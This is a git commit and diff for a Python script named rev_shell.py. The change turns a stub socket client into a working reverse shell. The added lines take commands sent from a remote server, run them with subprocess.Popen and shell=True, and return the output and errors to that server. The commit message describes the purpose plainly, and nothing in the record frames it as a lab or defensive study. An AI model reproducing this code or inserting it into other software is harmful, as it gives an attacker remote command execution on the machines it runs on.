2d4ba1fbaa1f7215d48bbcb1861ca1294c1e2978
gushls1 <protozik10012@gmail.com>
2025-01-21 22:22:57 -0500

    send shell commands from server and receiving output

--- rev_shell.py
+++ rev_shell.py
@@ -1,14 +1,16 @@
 #!/usr/bin/python
 
 import socket
+import subprocess
 
 def shell():
     while True:
-        cmd = s.recv(1024) # receive command from server
-        if cmd.decode('utf-8') == "exit":
+        cmd = s.recv(1024).decode('utf-8') # receive command from server
+        if cmd == "exit":
             break
-        output = "message from client"
-        s.send(output.encode('utf-8')) #send output to server
+        proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output = proc.stdout.read() + proc.stderr.read()
+        s.send(output) #send output to server
 
 #socket creation
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
